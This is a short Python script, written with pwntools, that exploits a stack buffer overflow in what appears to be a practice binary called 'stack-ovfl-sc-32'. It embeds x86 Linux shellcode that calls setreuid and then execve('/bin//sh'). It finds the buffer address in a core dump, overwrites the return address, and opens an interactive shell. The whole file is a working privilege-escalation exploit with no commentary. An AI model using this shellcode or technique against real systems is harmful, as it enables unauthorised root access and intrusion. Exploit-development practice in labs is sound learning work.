#!/usr/bin/env python

from pwn import *

SHELLCODE = '\xb82\x00\x00\x00\xcd\x80\x89\xc3\x89\xc1\xb8G\x00\x00\x00\xcd\x80\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xb8\x0b\x00\x00\x00j\x00hn/shh//bi\x89\xe3\xcd\x80'

ARG = ' '

ENV = {}

p = process(["stack-ovfl-sc-32", ARG], env=ENV )
buf = "AAAA"
#p.sendline(buf)
#p.wait

c = Core('./core')

addr_buf = c.stack.find(buf)

print(hex(addr_buf))

p = process(["stack-ovfl-sc-32",ARG], env=ENV)

buf = SHELLCODE + "A" * (0x8c - len(SHELLCODE)) + p32(addr_buf)

p.send(buf)

p.interactive()


